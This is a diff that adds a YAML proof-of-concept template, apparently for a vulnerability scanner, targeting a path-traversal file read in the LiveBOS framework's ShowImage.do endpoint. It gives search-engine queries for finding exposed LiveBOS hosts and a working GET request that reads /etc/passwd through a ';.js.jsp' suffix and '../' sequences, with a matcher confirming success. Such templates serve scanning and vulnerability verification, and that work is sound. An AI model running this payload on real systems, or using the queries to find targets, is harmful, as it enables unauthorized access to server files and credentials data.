@@ -1,0 +1,30 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="LiveBOS-框架" 
+    hunter-query: web.body=="images/login/login_submit.png"
+    quake-query: favicon:"ab5cb0d69141f827a24f2943dded6f9a"
+    zoomeye-query: app:"LiveBOS"
+    threatbook-query: #
+    cve: 
+    cnvd:
+
+name: poc-yaml-LiveBOS-ShowImage.do-file-read
+transport: http
+set:
+  s0: randomInt(1000,9999)
+  s1: randomLowercase(8)
+rules:
+  r0:
+    request:
+      method: GET
+      path: /feed/ShowImage.do;.js.jsp?type=&imgName=../../../../../../../../../../../../../../../etc/passwd
+      follow_redirects: false
+      headers:
+      body:
+    expression: >-
+      response.status == 200 && "root:[x*]:0:0:".matches(response.body_string)
+expression: r0() 
